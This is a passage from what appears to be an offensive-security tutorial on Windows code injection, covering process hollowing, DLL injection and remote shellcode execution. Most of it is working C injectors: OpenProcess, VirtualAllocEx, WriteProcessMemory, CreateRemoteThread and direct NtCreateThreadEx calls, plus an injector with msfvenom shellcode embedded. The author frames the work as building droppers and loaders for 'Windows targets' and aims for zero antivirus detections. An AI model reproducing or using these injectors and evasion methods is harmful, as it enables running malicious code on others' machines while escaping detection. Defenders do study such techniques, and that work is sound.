<p>Once the application is run is used to retrieve the full path of the currently running executable (the application itself), There is a conditional check using <code>strstr</code> to examine the <code>CurrentFilePath</code>. If the file path contains ‚ÄúGoogleUpdate.exe,‚Äù it displays a message box with the title and the message ‚Äúfoo‚Äù using the <code>MessageBoxA</code> function, If the file path doesn‚Äôt match the condition, the code continues to execute. It proceeds to call the <code>RunPortableExecutable</code> function, The target process for process hollowing is specified as ‚ÄúGoogleUpdate.exe.‚Äù It passes the source image, Otherwise, it proceeds with the process hollowing technique to inject and run code from another executable. This is a simple example.</p>
<h1><a name="dll-injection-techniques-6" class="anchor" href="37769.html#dll-injection-techniques-6"></a>DLL injection Techniques</h1>
<p>DLL injection is the act of introducing code into a currently executing process. Typically, the code we introduce takes the form of a dynamic link library (DLL) since DLLs are designed to be loaded as needed during runtime. However, this doesn‚Äôt preclude us from injecting assembly code or other forms of code (such as executables or handwritten code). It‚Äôs crucial to bear in mind that you must possess the necessary level of privileges on the system to engage in memory manipulation within other programs.</p>
<p>The Windows API provides a range of functions that enable us to attach to and manipulate other programs, primarily for debugging purposes. We will make use of these methods to execute DLL injection. I‚Äôve divided the DLL injection process into four distinct steps:</p>
<ol>
<li><strong>Attach</strong> to the process</li>
<li><strong>Allocate</strong> Memory within the process</li>
<li><strong>Copy</strong> the DLL or the DLL Path into the processes memory and determine appropriate memory addresses</li>
<li>Instruct the process to <strong>Execute</strong> your DLL</li>
</ol>
<p>Each one of these steps can be accomplished through the use of one or more programming techniques which are summarized in the below graphic. It‚Äôs important to understand the details/options present for each technique as they all have their positives and negatives.</p>
<ul>
<li><strong>LoadLibrary:</strong> Using the <code>LoadLibrary</code> function to load a DLL into a process.</li>
<li><strong>CreateRemoteThread:</strong> Injecting a DLL using the <code>CreateRemoteThread</code> function.</li>
<li><strong>SetWindowsHookEx:</strong> Using Windows hooks to inject code into other processes.</li>
<li><strong>Process Hollowing:</strong> Replacing the code and data of a legitimate process with a malicious DLL.</li>
</ul>
<p>We have a couple of options (e.g. <code>CreateRemoteThread()</code>,<code>NtCreateThreadEx()</code>, etc‚Ä¶) when instructing the target process to launch our DLL. Unfortunately we can‚Äôt just provide the name of our DLL to these functions, instead we have to provide a memory address to start execution at. We perform the <strong>Allocate</strong> and <strong>Copy</strong> steps to obtain space within the target process‚Äô memory and prepare it as an execution starting point.</p>
<p>There are two popular starting points: <code>LoadLibraryA()</code> and jumping to <code>DllMain</code>.</p>
<h4><a name="loadlibrarya-7" class="anchor" href="37769.html#loadlibrarya-7"></a><code>LoadLibraryA()</code></h4>
<p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms684175%28v=vs.85%29.aspx" rel="noopener nofollow ugc"><code>LoadLibraryA()</code></a> is a <code>kernel32.dll</code> function used to load DLLs, executables, and other supporting libraries at run time. It takes a filename as its only parameter and magically makes everything work. This means that we just need to allocate some memory for the path to our DLL and set our execution starting point to the address of <code>LoadLibraryA()</code>, providing the memory address where the path lies as a parameter.</p>
<p>The major downside to <code>LoadLibraryA()</code> is that it registers the loaded DLL with the program and thus can be easily detected. Another slightly annoying caveat is that if a DLL has already been loaded once with <code>LoadLibraryA()</code>, it will not execute it. You can work around this issue but it‚Äôs more code.</p>
<h4><a name="jumping-to-dllmain-or-another-entry-point-8" class="anchor" href="37769.html#jumping-to-dllmain-or-another-entry-point-8"></a>Jumping to <code>DllMain</code> (or another entry point)</h4>
<p>An alternative method to <code>LoadLibraryA()</code> is load the entire DLL into memory, then determine the offset to the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682583%28v=vs.85%29.aspx" rel="noopener nofollow ugc">DLL‚Äôs entry point</a>. Using this method you can avoid registering the DLL with the program (stealthy) and repeatedly inject into a process.</p>
<h3><a name="attaching-to-the-process-9" class="anchor" href="37769.html#attaching-to-the-process-9"></a>Attaching to the Process</h3>
<p>First we‚Äôll need a <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724176%28v=vs.85%29.aspx" rel="noopener nofollow ugc">handle</a> to the process so that we can interact with it. This is done with the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms684320%28v=vs.85%29.aspx" rel="noopener nofollow ugc">OpenProcess()</a> function. We‚Äôll also need request certain <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms684880%28v=vs.85%29.aspx" rel="noopener nofollow ugc">access rights</a> in order for us to perform the tasks below. The specific access rights we request vary across Windows versions, however the following should work for most:</p>
<pre><code class="lang-c">hHandle = OpenProcess( PROCESS_CREATE_THREAD | 
                       PROCESS_QUERY_INFORMATION | 
                       PROCESS_VM_OPERATION | 
                       PROCESS_VM_WRITE | 
                       PROCESS_VM_READ, 
                       FALSE, 
                       procID );
</code></pre>
<p>Before we can inject anything into another process, we‚Äôll need a place to put it. We‚Äôll use the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa366890%28v=vs.85%29.aspx" rel="noopener nofollow ugc"><code>VirtualAllocEx()</code></a> function to do so.</p>
<p><code>VirtualAllocEx()</code> takes amount of memory to allocate as one of its parameters. If we use <code>LoadLibraryA()</code>, we‚Äôll allocate space for the full path of the DLL and if we jump to the <code>DllMain</code>, we‚Äôll allocate space for the DLL‚Äôs full contents.</p>
<h3><a name="dll-path-10" class="anchor" href="37769.html#dll-path-10"></a>DLL Path</h3>
<p>Allocating space for just the DLL path slightly reduces the amount of code you‚Äôll need to write but not by much. It also requires you to use the <code>LoadLibraryA()</code> method which has some downsides (described above). That being said, it is a very popular method.</p>
<p>Use <code>VirtualAllocEx()</code> and allocate enough memory to support a string which contains the path to the DLL:</p>
<pre><code class="lang-c">GetFullPathName(TEXT("foo.dll"), 
                BUFSIZE, 
                dllPath, //Output to save the full DLL path
                NULL);

dllPathAddr = VirtualAllocEx(hHandle, 
                             0, 
                             strlen(dllPath), 
                             MEM_RESERVE|MEM_COMMIT, 
                             PAGE_EXECUTE_READWRITE);
</code></pre>
<h3><a name="full-dll-11" class="anchor" href="37769.html#full-dll-11"></a>Full DLL</h3>
<p>Allocating space for the full DLL requires a little more code however it‚Äôs also much more reliable and doesn‚Äôt need to use <code>LoadLibraryA()</code>.</p>
<p>First, open a handle to the DLL with <code>CreateFileA()</code> then calculate its size with <code>GetFileSize()</code> and pass it to <code>VirtualAllocEx()</code>:</p>
<pre><code class="lang-c">
GetFullPathName(TEXT("foo.dll"), 
                BUFSIZE, 
                dllPath, //Output to save the full DLL path
                NULL);

hFile = CreateFileA( dllPath, 
                     GENERIC_READ, 
                     0, 
                     NULL, 
                     OPEN_EXISTING, 
                     FILE_ATTRIBUTE_NORMAL, 
                     NULL );

dllFileLength = GetFileSize( hFile, 
                             NULL );

remoteDllAddr = VirtualAllocEx( hProcess, 
                                NULL, 
                                dllFileLength, 
                                MEM_RESERVE|MEM_COMMIT, 
                                PAGE_EXECUTE_READWRITE ); 

</code></pre>
<p>Now that we have space allocated in our target process, we can copy our DLL Path or the Full DLL (depending on the method you choose) into that process. We‚Äôll use <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms681674%28v=vs.85%29.aspx" rel="noopener nofollow ugc">WriteProcessMemory()</a> to do so:</p>
<h3><a name="dll-path-12" class="anchor" href="37769.html#dll-path-12"></a>DLL Path</h3>
<pre><code class="lang-c">
WriteProcessMemory(hHandle, 
                   dllPathAddr, 
                   dllPath, 
                   strlen(dllPath), 
                   NULL);

</code></pre>
<h3><a name="full-dll-13" class="anchor" href="37769.html#full-dll-13"></a>Full DLL</h3>
<p>We‚Äôll first need to read our DLL into memory before we copy it to the remote processes.</p>
<pre><code class="lang-c">
lpBuffer = HeapAlloc( GetProcessHeap(), 
                      0, 
                      dllFileLength); 

ReadFile( hFile, 
          lpBuffer, 
          dllFileLength, 
          &amp;dwBytesRead;, 
          NULL );

WriteProcessMemory( hProcess, 
                    lpRemoteLibraryBuffer, 
                    lpBuffer,  
                    dllFileLength, 
                    NULL );

</code></pre>
<h3><a name="determining-our-execution-starting-point-14" class="anchor" href="37769.html#determining-our-execution-starting-point-14"></a>Determining our Execution Starting Point</h3>
<p>Most execution functions take a memory address to start at, so we‚Äôll need to determine what that will be.</p>
<h3><a name="dll-path-and-loadlibrarya-15" class="anchor" href="37769.html#dll-path-and-loadlibrarya-15"></a>DLL Path and <code>LoadLibraryA()</code></h3>
<p>We‚Äôll search our own process memory for the starting address of <code>LoadLibraryA()</code>, then pass it to our execution function with the memory address of DLL Path as it‚Äôs parameter. To get <code>LoadLibraryA()</code>'s address, we‚Äôll use <code>GetModuleHandle()</code> and <code>GetProcAddress()</code>:</p>
<pre><code class="lang-c">loadLibAddr = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "LoadLibraryA");
</code></pre>
<h3><a name="full-dll-and-jump-to-dllmain-16" class="anchor" href="37769.html#full-dll-and-jump-to-dllmain-16"></a>Full DLL and Jump to <code>DllMain</code></h3>
<p>By copying the entire DLL into memory we can avoid registering our DLL with the process and more reliably inject. The somewhat difficult part of doing this is obtaining the entry point to our DLL when it‚Äôs loaded in memory. So we‚Äôll use the <code>GetReflectiveLoaderOffset()</code> from it to determine our offset in our processes memory then use that offset plus the base address of the memory in the victim process we wrote our DLL to as the execution starting point. It‚Äôs important to note here that the DLL we‚Äôre injecting must complied with the appropriate includes and options so that it aligns itself with the ReflectiveDLLInjection method.</p>
<pre><code class="lang-auto">dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpWriteBuff);
</code></pre>
<h3><a name="executing-the-dll-17" class="anchor" href="37769.html#executing-the-dll-17"></a>Executing the DLL!</h3>
<p>At this point we have our DLL in memory and we know the memory address we‚Äôd like to start execution at. All that‚Äôs really left is to tell our process to execute it. There are a couple of ways to do this.</p>
<h4><a name="createremotethread-18" class="anchor" href="37769.html#createremotethread-18"></a><code>CreateRemoteThread()</code></h4>
<p>The <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682437%28v=vs.85%29.aspx" rel="noopener nofollow ugc"><code>CreateRemoteThread()</code></a> function is probably the most widely known and used method. It‚Äôs very reliable and works most times however you may want to use another method to avoid detection or if Microsoft changes something to cause <code>CreateRemoteThread()</code> to stop working.</p>
<p>Since <code>CreateRemoteThread()</code> is a very established function, you have a greater flexibility in how you use it. For instance, you can do things like use Python to do DLL injection!</p>
<pre><code class="lang-auto">rThread = CreateRemoteThread(hTargetProcHandle, NULL, 0, lpStartExecAddr, lpExecParam, 0, NULL);
WaitForSingleObject(rThread, INFINITE);
</code></pre>
<h4><a name="ntcreatethreadex-19" class="anchor" href="37769.html#ntcreatethreadex-19"></a><code>NtCreateThreadEx()</code></h4>
<p><code>NtCreateThreadEx()</code> is an undocumented <code>ntdll.dll</code> function. The trouble with undocumented functions is that they may disappear or change at any moment Microsoft decides. That being said, <code>NtCreateThreadEx()</code> came in good handy when Windows session separation affected <code>CreateRemoteThread()</code> DLL injection.</p>
<p><code>NtCreateThreadEx()</code> is a bit more complicated to call, we‚Äôll need a specific structure to pass to it and another to receive data from it. I‚Äôve detailed the implementation here:</p>
<pre><code class="lang-c">struct NtCreateThreadExBuffer {
 ULONG Size;
 ULONG Unknown1;
 ULONG Unknown2;
 PULONG Unknown3;
 ULONG Unknown4;
 ULONG Unknown5;
 ULONG Unknown6;
 PULONG Unknown7;
 ULONG Unknown8;
 }; 


typedef NTSTATUS (WINAPI *LPFUN_NtCreateThreadEx) (
 OUT PHANDLE hThread,
 IN ACCESS_MASK DesiredAccess,
 IN LPVOID ObjectAttributes,
 IN HANDLE ProcessHandle,
 IN LPTHREAD_START_ROUTINE lpStartAddress,
 IN LPVOID lpParameter,
 IN BOOL CreateSuspended,
 IN ULONG StackZeroBits,
 IN ULONG SizeOfStackCommit,
 IN ULONG SizeOfStackReserve,
 OUT LPVOID lpBytesBuffer
);

HANDLE bCreateRemoteThread(HANDLE hHandle, LPVOID loadLibAddr, LPVOID dllPathAddr) {

 HANDLE hRemoteThread = NULL;

 LPVOID ntCreateThreadExAddr = NULL;
 NtCreateThreadExBuffer ntbuffer;
 DWORD temp1 = 0; 
 DWORD temp2 = 0; 

 ntCreateThreadExAddr = GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtCreateThreadEx");

 if( ntCreateThreadExAddr ) {
 
  ntbuffer.Size = sizeof(struct NtCreateThreadExBuffer);
  ntbuffer.Unknown1 = 0x10003;
  ntbuffer.Unknown2 = 0x8;
  ntbuffer.Unknown3 = &amp;temp2;
  ntbuffer.Unknown4 = 0;
  ntbuffer.Unknown5 = 0x10004;
  ntbuffer.Unknown6 = 4;
  ntbuffer.Unknown7 = &amp;temp1;
  ntbuffer.Unknown8 = 0;

  LPFUN_NtCreateThreadEx funNtCreateThreadEx = (LPFUN_NtCreateThreadEx)ntCreateThreadExAddr;
  NTSTATUS status = funNtCreateThreadEx(
          &amp;hRemoteThread;,
          0x1FFFFF,
          NULL,
          hHandle,
          (LPTHREAD_START_ROUTINE)loadLibAddr,
          dllPathAddr,
          FALSE,
          NULL,
          NULL,
          NULL,
          &amp;ntbuffer;
          );
  
  if (hRemoteThread == NULL) {
   printf("\t[!] NtCreateThreadEx Failed! [%d][%08x]\n", GetLastError(), status);
   return NULL;
  } else {
   return hRemoteThread;
  }
 } else {
  printf("\n[!] Could not find NtCreateThreadEx!\n");
 }
 return NULL;

}
</code></pre>
<p>Now we can call it very much like <code>CreateRemoteThread()</code>:</p>
<pre><code class="lang-c">rThread = bCreateRemoteThread(hTargetProcHandle, lpStartExecAddr, lpExecParam);
WaitForSingleObject(rThread, INFINITE);
</code></pre>
<h1><a name="shellcode-execution-techniques-20" class="anchor" href="37769.html#shellcode-execution-techniques-20"></a>Shellcode Execution Techniques</h1>
<p>Now, let‚Äôs dive into the world of ‚Äòinjections.‚Äô, we‚Äôll begin with some benign code that leverages Win32 APIs. We‚Äôll examine how it functions at a fundamental level and then transition toward more evil code, aiming to bypass these APIs and arrive at a more malicious outcome, Sounds Good So Check This out:</p>
<pre><code class="lang-c">int main(void){

    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};

    if(!CreateProcessW(
        L"C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        BELOW_NORMAL_PRIORITY_CLASS,
        NULL,
        NULL,
        &amp;si,
        &amp;pi
)){
        printf("(-) failed to create process, error: %ld", GetLastError());
        return EXIT_FAILURE;
    }

    printf("(+) process started! PID:%ld", pi.dwProcessId);
    return EXIT_SUCCESS;
}
</code></pre>
<p>What‚Äôs the purpose of this code, you may wonder? You likely have an inkling already, don‚Äôt you? Well, we‚Äôre initiating a fresh Notepad process. Let me assure you, there‚Äôs nothing shady about this code it‚Äôs entirely above board and legitimate. We‚Äôre utilizing the ‚ÄòCreateProcessW‚Äô function, which is all about orchestrating the precise way a new process should be launched. You provide it with a set of parameters, and voil√†, a new process comes to life.</p>
<pre><code class="lang-auto">BOOL CreateProcessW(
  [in, optional]      LPCWSTR               lpApplicationName,
  [in, out, optional] LPWSTR                lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCWSTR               lpCurrentDirectory,
  [in]                LPSTARTUPINFOW        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
</code></pre>
<p>Now, let‚Äôs take a deeper look into our coding journey. We‚Äôre not inventing something entirely new; instead, we‚Äôre refining existing code droppers and loaders for Windows targets, making them responsive to our session commands.</p>
<p>Our goal here is to run unrestricted shellcode. Our toolkit includes familiar Windows API functions: ‚ÄòOpenProcess,‚Äô ‚ÄòVirtualAllocEx,‚Äô ‚ÄòWriteProcessMemory,‚Äô and ‚ÄòCreateRemoteThread.‚Äô Think of it as conducting an orchestra, where each function plays a specific role in enabling the shellcode to do its job. We‚Äôre in charge, and the Windows targets should be ready to follow our instructions.</p>
<h2><a name="injection-21" class="anchor" href="37769.html#injection-21"></a>Injection</h2>
<pre><code class="lang-c">int main()
{
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    
(!CreateProcessW(
        L"C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        BELOW_NORMAL_PRIORITY_CLASS,
        NULL,
        NULL,
        &amp;si,
        &amp;pi
));
  
  char shellcode[] ={
  };

    HANDLE hProcess; 
    HANDLE hThread;
    void*exec_mem;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS,TRUE,pi.dwProcessId);
    exec_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, exec_mem, shellcode, sizeof(shellcode), NULL);
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL,0,0);
    CloseHandle(hProcess);
    return 0;
}
</code></pre>
<p>Alright, do you notice any differences? Bingo, there‚Äôs ‚Äúshellcode.‚Äù Let me clarify; the initial code segment was straightforward, mainly focusing on creating a new process (Notepad) and adjusting its priority class. However, the code we‚Äôre dealing with now is more sinister, as it centers around remote process injection and the implementation of functions such as <code>OpenProcess</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code> to allocate memory within a target process and execute custom shellcode within it.</p>
<p>Nevertheless, plaintext Metasploit (msf) shellcode tends to raise red flags and is susceptible to detection by antivirus engines. In the preceding section, we delved into shellcode development, particularly emphasizing a reverse shell. Yet, this code is simpler and can be swiftly pinpointed by antivirus engines. So, let‚Äôs explore an alternative strategy how about encoding the shellcode into Read-Write-Execute (RWX) memory to initiate Notepad?</p>
<p>Alright, RWX memory implementation is fairly straightforward for our intended purpose. It involves searching a process‚Äôs private virtual memory space (the userland virtual memory space) for a memory section marked as <em>PAGE_EXECUTE_READWRITE</em>. If such a space is found, it‚Äôs returned. If not, the next search address is adjusted to the subsequent memory region (<em>BaseAddress</em> + <em>Memory Region</em>).</p>
<p>To finalize this for code execution, our shellcode must then be relocated to that discovered memory region and executed. An efficient way to achieve this is to resort WinAPI calls, similar to what we demonstrated in the first technique. However, it‚Äôs essential to consider the drawbacks of that approach, as discussed above.</p>
<pre><code class="lang-c">int main(int argc, char * argv[])  
{  
    // msfvenom -p windows/x64/exec CMD=notepad.exe -f c  
    unsigned char shellcode[] =  
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";
        
    int newPid = atoi(argv[1]);  
    printf("Injecting into pid %d\n", newPid);  
  
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, (DWORD)newPid);  
    if (!pHandle)  
    {  
        printf("Invalid Handle\n");  
        exit(1);  
    }  
    LPVOID remoteBuf = VirtualAllocEx(pHandle, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
    if (!remoteBuf)  
    {  
        printf("Alloc Fail\n");  
        exit(1);  
    }  
    printf("alloc addr: %p\n", remoteBuf);  
    WriteProcessMemory(pHandle, remoteBuf, shellcode, sizeof(shellcode), NULL);  
    CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);  
    return 0;  
}
</code></pre>
<p>Let‚Äôs try to move away from them and directly use the undocumented functions within <code>ntdll.dll</code> in this one we go level lower where we do the syscalls directly.</p>
<p>We need:</p>
<ul>
<li>NtAllocateVirtualMemory</li>
<li>NtWriteVirtualMemory</li>
<li>NtCreateThreadEx</li>
</ul>
<p>Since these APIs are not documented by Microsoft, we need to find some external references made by reverse engineers. <a href="http://undocumented.ntinternals.net/" rel="noopener nofollow ugc">http://undocumented.ntinternals.net/</a></p>
<p>Let‚Äôs look at the definition of an <code>NTAPI</code> function from the reference link:</p>
<pre><code class="lang-auto">NTSYSAPI   
NTSTATUS  
NTAPI  
  
NtAllocateVirtualMemory(  
  
  
  IN HANDLE               ProcessHandle,  
  IN OUT PVOID            *BaseAddress,  
  IN ULONG                ZeroBits,  
  IN OUT PULONG           RegionSize,  
  IN ULONG                AllocationType,  
  IN ULONG                Protect );
</code></pre>
<p><code>NTSTATUS</code> is the actual return value, while <code>NTSYSAPI</code> marks the function as a library import and <code>NTAPI</code> defines the windows api calling convention.</p>
<p><code>IN</code> means the function requires it as input, while <code>OUT</code> means that the parameter passed in is modified with some return output.</p>
<p>When we prototype the functions, we just need to note the <code>NTAPI</code> part.<br>
In fact you can also use <code>WINAPI</code> since the both of them resolve to <code>__stdcall</code>.</p>
<pre><code class="lang-c">typedef NTSTATUS(NTAPI* NAVM)(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG);  
typedef NTSTATUS(NTAPI* NWVM)(HANDLE, PVOID, PVOID, ULONG, PULONG);  
typedef NTSTATUS(NTAPI* NCT)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);
</code></pre>
<p>Here we prototype some function pointers that we‚Äôll map the address of the actual functions in <code>ntdll.dll</code> to later.</p>
<p>You might notice that some types are also missing, for example the <code>POBJECT_ATTRIBUTES</code>, so let‚Äôs find and define them from the references.</p>
<pre><code class="lang-c">typedef struct _UNICODE_STRING {  
    USHORT Length;  
    USHORT MaximumLength;  
    PWSTR  Buffer;  
} UNICODE_STRING, *PUNICODE_STRING;  
  
typedef struct _OBJECT_ATTRIBUTES {  
    ULONG           Length;  
    HANDLE          RootDirectory;  
    PUNICODE_STRING ObjectName;  
    ULONG           Attributes;  
    PVOID           SecurityDescriptor;  
    PVOID           SecurityQualityOfService;  
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;  
  
typedef struct _PS_ATTRIBUTE {  
    ULONG Attribute;  
    SIZE_T Size;  
    union {  
        ULONG Value;  
        PVOID ValuePtr;  
    } u1;  
    PSIZE_T ReturnLength;  
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;  
  
typedef struct _PS_ATTRIBUTE_LIST  
{  
    SIZE_T       TotalLength;  
    PS_ATTRIBUTE Attributes[1];  
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
</code></pre>
<p>Now Let‚Äôs load <code>ntdll.dll</code> and map the functions.</p>
<pre><code class="lang-c">HINSTANCE hNtdll = LoadLibraryW(L"ntdll.dll");  
if (!hNtdll)  
{  
    printf("Load ntdll fail\n");  
    exit(1);  
}  
  
NAVM NtAllocateVirtualMemory = (NAVM)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");  
NWVM NtWriteVirtualMemory = (NWVM)GetProcAddress(hNtdll, "NtWriteVirtualMemory");  
NCT NtCreateThreadEx = (NCT)GetProcAddress(hNtdll, "NtCreateThreadEx");
</code></pre>
<p>Finally we can call these functions.</p>
<pre><code class="lang-c">typedef NTSTATUS(NTAPI* NAVM)(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG);  
typedef NTSTATUS(NTAPI* NWVM)(HANDLE, PVOID, PVOID, ULONG, PULONG);  
typedef NTSTATUS(NTAPI* NCT)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);  
  
int main(int argc, char * argv[])  
{  
    // msfvenom -p windows/x64/exec CMD=notepad.exe -f c  
    unsigned char shellcode[] =  
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";
     
	int newPid = atoi(argv[1]);  
	printf("Injecting into pid %d\n", newPid);  
  
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, (DWORD)newPid);  
    if (!pHandle)  
    {  
        printf("Invalid Handle\n");  
        exit(1);  
    }  
    HANDLE tHandle;  
    HINSTANCE hNtdll = LoadLibraryW(L"ntdll.dll");  
    if (!hNtdll)  
    {  
        printf("Load ntdll fail\n");  
        exit(1);  
    }  
  
    NAVM NtAllocateVirtualMemory = (NAVM)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");  
    NWVM NtWriteVirtualMemory = (NWVM)GetProcAddress(hNtdll, "NtWriteVirtualMemory");  
    NCT NtCreateThreadEx = (NCT)GetProcAddress(hNtdll, "NtCreateThreadEx");  
    void * allocAddr = NULL;  
    SIZE_T allocSize = sizeof(shellcode);  
    NTSTATUS status;  
    status = NtAllocateVirtualMemory(pHandle, &amp;allocAddr, 0, (PULONG)&amp;allocSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
    printf("status alloc: %X\n", status);  
    printf("alloc addr: %p\n", allocAddr);  
    status = NtWriteVirtualMemory(pHandle, allocAddr, shellcode, sizeof(shellcode), NULL);  
    printf("status write: %X\n", status);  
    status = NtCreateThreadEx(&amp;tHandle, GENERIC_EXECUTE, NULL, pHandle, allocAddr, NULL, 0, 0, 0, 0, NULL);  
    printf("status exec: %X\n", status);  
  
	return 0;  
}
</code></pre>
<p>So, if you decide to upload this to antivirus engines (which I don‚Äôt recommend, but the choice is yours), what can you expect? Well, you might see 27 out of 72 detections triggering alarms left and right, screaming ‚ÄòMALICIOUS!‚Äô It‚Äôs as if the antivirus engines are having a celebration. But here‚Äôs the real challenge: we‚Äôre striving for a complete absence of detections. We‚Äôre not looking for a party, we‚Äôre after more stealthy.</p>
